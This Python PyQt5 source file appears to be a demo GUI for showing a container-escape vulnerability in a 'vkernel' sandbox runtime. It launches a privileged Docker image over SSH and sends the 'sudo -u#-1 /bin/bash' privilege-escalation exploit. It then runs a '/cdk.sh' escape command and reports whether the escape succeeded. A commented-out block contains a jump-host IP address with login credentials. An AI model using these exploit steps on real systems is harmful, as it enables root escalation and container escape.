import sys
import time

from PyQt5 import QtWidgets, QtGui, QtCore
from PyQt5.QtCore import Qt
import paramiko


class RemoteConnectionApp(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('vkernel-display')
        self.setGeometry(100, 100, 400, 200)

        layout = QtWidgets.QVBoxLayout()

        button0 = QtWidgets.QToolButton(self)
        button0.clicked.connect(self.create_container)
        button0.setIcon(QtGui.QIcon('Create a container.png'))
        button0.setIconSize(QtCore.QSize(128, 128))
        # button0.setText('Create')
        # button0.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button0, alignment=QtCore.Qt.AlignCenter)

        button1 = QtWidgets.QToolButton(self)
        button1.clicked.connect(entry_container)
        button1.setIcon(QtGui.QIcon('enter.png'))
        button1.setIconSize(QtCore.QSize(128, 128))
        # button1.setText("Entry container")
        # button1.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button1, alignment=QtCore.Qt.AlignCenter)

        self.button2 = QtWidgets.QToolButton(self)
        self.button2.clicked.connect(self.button2_clicked)
        self.button2.setIconSize(QtCore.QSize(128, 128))
        # button1.setText("Build vkernel")
        # button1.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(self.button2, alignment=QtCore.Qt.AlignCenter)

        self.setLayout(layout)

        self.flag = False
        self.update_button_icon()

    def create_container(self):
        if self.flag:
            command = "docker run --rm -d -p 2222:22 --privileged --runtime=vkernel-runtime vkernel-cve"
        else:
            command = "docker run --rm -d -p 2222:22 --privileged vkernel-cve"

        process = QtCore.QProcess(self)
        process.setProcessChannelMode(QtCore.QProcess.MergedChannels)

        process.start(command)
        process.waitForFinished()

        # Check if there was an error during the command execution
        if process.exitStatus() != QtCore.QProcess.NormalExit:
            error_message = "Error occurred while executing the command."
            msg_box = QtWidgets.QMessageBox(self)
            msg_box.setWindowTitle('Command Error')
            msg_box.setText("Error:")
            msg_box.setInformativeText(error_message)
            msg_box.setIcon(QtWidgets.QMessageBox.Critical)
            msg_box.exec_()
            return

        output = process.readAll().data().decode()

        # Show the command output in a QMessageBox
        msg_box = QtWidgets.QMessageBox(self)
        msg_box.setWindowTitle('Command Output')
        msg_box.setText("Command Output:")
        msg_box.setInformativeText(output)
        msg_box.setIcon(QtWidgets.QMessageBox.Information)
        msg_box.exec_()

    def button2_clicked(self):
        if self.flag:
            self.flag = False
            # QtWidgets.QMessageBox.critical(self, 'Close', 'close')
        else:
            self.flag = True
            # QtWidgets.QMessageBox.critical(self, 'Open', 'open')
        self.update_button_icon()

    def update_button_icon(self):
        if self.flag:
            self.button2.setIcon(QtGui.QIcon('close.png'))
        else:
            self.button2.setIcon(QtGui.QIcon('open.png'))


def entry_container():
    remote_command_app = ContainerCommandApp()
    remote_command_app.show()


class ContainerCommandApp(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.client = None
        self.channel = None
        self.connect_container()

        self.setWindowTitle('Container')
        self.setGeometry(100, 100, 400, 300)

        layout = QtWidgets.QVBoxLayout()

        button = QtWidgets.QToolButton(self)
        button.clicked.connect(self.upgrade_to_root)
        button.setIcon(QtGui.QIcon('user_root.png'))
        button.setIconSize(QtCore.QSize(100, 100))
        button.setText('Root')
        button.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button, alignment=QtCore.Qt.AlignCenter)

        button0 = QtWidgets.QToolButton(self)
        button0.clicked.connect(
            lambda _, cmd='id': self.execute_command(cmd))
        button0.setIcon(QtGui.QIcon('who.png'))
        button0.setIconSize(QtCore.QSize(100, 100))
        button0.setText('Who am I')
        button0.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button0, alignment=QtCore.Qt.AlignCenter)

        button1 = QtWidgets.QToolButton(self)
        button1.clicked.connect(
            lambda _, cmd='/cdk.sh "touch /tmp/test_dir/key.txt"': self.execute_command(cmd))
        button1.setIcon(QtGui.QIcon('file.png'))
        button1.setIconSize(QtCore.QSize(100, 100))
        button1.setText('Create file')
        button1.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button1, alignment=QtCore.Qt.AlignCenter)

        self.setLayout(layout)

    def connect_container(self):
        try:
            self.client = paramiko.SSHClient()
            self.client.load_system_host_keys()
            self.client.set_missing_host_key_policy(paramiko.WarningPolicy())

            remote_host = '127.0.0.1'
            username = 'testuser'
            password = 'testuser'

            self.client.connect(hostname=remote_host, username=username, password=password, port=2222)

            # 使用paramiko.Channel和paramiko.invoke_shell实现交互式shell会话
            self.channel = self.client.invoke_shell()
            time.sleep(3)
            output = ""
            while not self.channel.recv_ready():
                continue
            while self.channel.recv_ready():
                output += self.channel.recv(65535).decode()
            print(output)
        except paramiko.AuthenticationException:
            QtWidgets.QMessageBox.critical(self, '进入容器失败', '认证失败，请检查用户名和密码。')
        except Exception as e:
            QtWidgets.QMessageBox.critical(self, '进入容器失败', f"无法进入容器: {e}")

    def upgrade_to_root(self):
        while self.channel.recv_ready():
            self.channel.recv(65535).decode()

        self.channel.send("sudo -u#-1 /bin/bash\n")
        output = ""
        while not self.channel.recv_ready():
            continue
        while self.channel.recv_ready():
            output += self.channel.recv(65535).decode()
        if 'Authentication failure' in output:
            QtWidgets.QMessageBox.critical(self, 'Failed', '切换到root用户失败。')
            return
        else:
            QtWidgets.QMessageBox.information(self, 'Succeed', '成功切换到root用户。')

    def execute_command(self, command):
        print(command)
        while self.channel.recv_ready():
            self.channel.recv(65535).decode()
        self.channel.send(f"{command}\n")
        time.sleep(3)
        output = ""
        while not self.channel.recv_ready():
            continue
        while self.channel.recv_ready():
            output += self.channel.recv(65535).decode()
        print(output)
        if command == "id":
            if "root" in output:
                QtWidgets.QMessageBox.information(self, 'root', 'I am root')
            else:
                QtWidgets.QMessageBox.information(self, 'testuser', 'I am testuser')
        else:
            if "permission denied" in output:
                QtWidgets.QMessageBox.warning(self, 'Failed', '逃逸失败')
            else:
                QtWidgets.QMessageBox.information(self, 'Succeed', '逃逸成功')

    def closeEvent(self, event):
        if self.client is not None:
            self.client.close()
            self.client = None


# class ContainerCommandApp(QtWidgets.QWidget):
#     def __init__(self):
#         super().__init__()
#         self.setWindowTitle('Container')
#         self.setGeometry(100, 100, 400, 300)
#
#         layout = QtWidgets.QVBoxLayout()
#
#         button0 = QtWidgets.QToolButton(self)
#         button0.clicked.connect(lambda _, cmd='pwd': self.execute_command(cmd))
#         button0.setIcon(QtGui.QIcon('Create a container.png'))
#         button0.setIconSize(QtCore.QSize(100, 100))
#         button0.setText('pwd')
#         button0.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
#         layout.addWidget(button0)
#
#         # button1 = QtWidgets.QToolButton(self)
#         # button1.clicked.connect(self.upgrade_to_root())
#         # button1.setIcon(QtGui.QIcon('upgrade_to_root.png'))
#         # button1.setIconSize(QtCore.QSize(100, 100))
#         # button1.setText('upgrade to root')
#         # button1.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
#         # layout.addWidget(button1)
#
#         self.setLayout(layout)
#
#         self.jump_client = None
#         self.container = None
#         self.ssh_client = None
#
#     def connect_to_jump_host(self):
#         host = '202.114.7.81'
#         username = 'yuehang'
#         password = 'yuehang'
#
#         self.jump_client = paramiko.SSHClient()
#         self.jump_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#         self.jump_client.connect(host, username=username, password=password)
#
#     def entry_container(self):
#         self.connect_to_jump_host()
#         try:
#             if self.jump_client:
#                 transport = self.jump_client.get_transport()
#                 container_addr = ('127.0.0.1', 2222)  # 替换为目标主机的地址和端口
#                 local_addr = ('localhost', 0)
#                 self.container = transport.open_channel("direct-tcpip", container_addr, local_addr)
#
#                 self.ssh_client = paramiko.SSHClient()
#                 self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#                 self.ssh_client.connect('localhost', username='testuser', password='testuser', sock=self.container)
#         except paramiko.AuthenticationException:
#             QtWidgets.QMessageBox.critical(self, '远程连接错误', '认证失败，请检查用户名和密码。')
#         except Exception as e:
#             QtWidgets.QMessageBox.critical(self, '远程连接错误', f"无法连接到远程主机: {e}")
#
#     def upgrade_to_root(self):
#         stdin, stdout, stderr = self.ssh_client.exec_command("sudo su -")
#         stdin.write('root' + "\n")
#         stdin.flush()
#         return stdout.channel.recv_exit_status() == 0
#
#     def execute_command(self, command, flag=False):
#         self.entry_container()
#         if flag:
#             self.upgrade_to_root()
#         stdin, stdout, stderr = self.ssh_client.exec_command(command)
#         output = stdout.read().decode()
#         error = stderr.read().decode().strip()
#         if output:
#             print(f"Output from remote host: {output}")
#         elif error:
#             print(f"Error from remote host: {error}")
#
#         self.ssh_client.close()


if __name__ == '__main__':
    app = QtWidgets.QApplication(sys.argv)
    remote_connection_app = RemoteConnectionApp()
    remote_connection_app.show()
    sys.exit(app.exec_())
